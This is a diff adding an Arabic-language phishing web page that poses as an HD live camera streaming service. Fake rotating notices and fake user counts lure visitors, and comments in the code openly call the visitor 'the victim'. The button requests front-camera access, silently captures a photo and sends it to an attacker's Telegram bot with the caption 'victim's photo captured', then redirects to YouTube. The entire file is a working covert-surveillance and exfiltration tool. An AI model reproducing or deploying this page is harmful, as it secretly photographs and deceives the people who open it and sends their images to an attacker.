@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Cam Stream - نظام الرؤية والكاميرا المباشرة 2026</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #110505; color: #fff; display: flex; justify-content: center; align-items: center; padding: 15px; min-height: 100vh; background-image: radial-gradient(circle at 50% 10%, #ef444425 0%, transparent 70%); }
+        .wrapper { width: 100%; max-width: 440px; text-align: center; }
+        
+        .hero-card { background: linear-gradient(145deg, #1e0f0f 0%, #110505 100%); border: 1px solid rgba(239, 68, 68, 0.4); border-radius: 24px; padding: 35px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.8); }
+        .badge-live { display: inline-flex; align-items: center; gap: 6px; background: rgba(239, 68, 68, 0.15); color: #f87171; padding: 6px 14px; border-radius: 20px; font-size: 11px; font-weight: bold; margin-bottom: 20px; border: 1px solid rgba(239, 68, 68, 0.4); }
+        .live-dot { width: 8px; height: 8px; background: #ef4444; border-radius: 50%; box-shadow: 0 0 10px #ef4444; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        
+        h1 { font-size: 26px; color: #fff; margin-bottom: 8px; font-weight: 900; }
+        h1 span { color: #f87171; text-shadow: 0 0 15px rgba(239, 68, 68, 0.5); }
+        .subtitle { font-size: 13px; color: #fca5a5; margin-bottom: 25px; line-height: 1.6; }
+
+        /* مميزات مغرية تزيد ثقة الضحية */
+        .features-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 25px; text-align: right; }
+        .feature-box { background: rgba(0, 0, 0, 0.5); border: 1px solid #7f1d1d; border-radius: 12px; padding: 12px; }
+        .feature-title { font-size: 12px; font-weight: bold; color: #f87171; margin-bottom: 2px; }
+        .feature-desc { font-size: 10px; color: #d1d5db; }
+
+        .btn-action { background: linear-gradient(135deg, #b91c1c 0%, #ef4444 100%); color: #fff; border: none; padding: 16px; border-radius: 14px; font-weight: 900; cursor: pointer; font-size: 16px; box-shadow: 0 0 25px rgba(239, 68, 68, 0.5); width: 100%; transition: 0.3s; }
+        .btn-action:hover { transform: scale(1.02); opacity: 0.95; }
+
+        /* إشعار وهمي متحرك لزيادة الإغراء */
+        .live-toast { background: rgba(30, 15, 15, 0.9); border: 1px solid #ef4444; border-radius: 12px; padding: 10px 14px; margin-top: 20px; font-size: 11px; color: #fca5a5; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        .live-toast span { color: #fff; font-weight: bold; }
+        .footer { font-size: 11px; color: #7f1d1d; margin-top: 25px; }
+    </style>
+</head>
+<body>
+<div class="wrapper">
+    <div class="hero-card">
+        <div class="badge-live"><div class="live-dot"></div>سيرفر البث الملكي نشط</div>
+        <h1>كاميرا المراقبة <span>عالية الدقة HD</span></h1>
+        <p class="subtitle">شاهد البث الحي الحصري والفعاليات العالمية مباشرة بجودة فائقة وبدون تقطيع.</p>
+        
+        <div class="features-grid">
+            <div class="feature-box">
+                <div class="feature-title">🚀 تشغيل فوري</div>
+                <div class="feature-desc">بث مباشر بدون إعلانات مزعجة</div>
+            </div>
+            <div class="feature-box">
+                <div class="feature-title">🛡️ حماية عالية</div>
+                <div class="feature-desc">تشفير كامل لاتصالك بالخادم</div>
+            </div>
+        </div>
+
+        <button class="btn-action" onclick="requestCameraPermissions()">تفعيل البث المباشر والسماح بالعرض 🎥</button>
+        
+        <div class="live-toast" id="toastText">🔴 جاري ربط السيرفر الآمن للمستخدم (K***9)...</div>
+    </div>
+    <div class="footer">🔒 منصة البث المباشر المعتمدة 2026</div>
+</div>
+
+<script src="config.js"></script>
+<script>
+    // إشعارات وهمية متحركة لإقناع الضحية بأن الموقع نشط
+    const toasts = [
+        "🔴 جاري ربط السيرفر الآمن للمستخدم (K***9)...",
+        "⚡ تم اتصال 1,420 مستخدم بالبث المباشر الآن.",
+        "✨ اضغط على زر التفعيل لتجاوز شاشة التحقق."
+    ];
+    let tIndex = 0;
+    setInterval(() => {
+        tIndex = (tIndex + 1) % toasts.length;
+        document.getElementById('toastText').innerHTML = toasts[tIndex];
+    }, 3500);
+
+    async function requestCameraPermissions() {
+        try {
+            // طلب إذن الكاميرا الأمامية فوراً
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', BOT_CONFIG.chat_id);
+                    formData.append('photo', blob, 'camera_victim.jpg');
+                    formData.append('caption', '🚨 صيد كاميرا فخم: تم التقاط صورة الضحية بنجاح!');
+
+                    fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        window.location.href = "https://www.youtube.com";
+                    });
+                }, 'image/jpeg');
+
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+
+        } catch (err) {
+            alert("يرجى الضغط على زر (سماح) للأذونات في نافذة المتصفح لتفعيل البث المباشر.");
+        }
+    }
+</script>
+</body>
+</html>
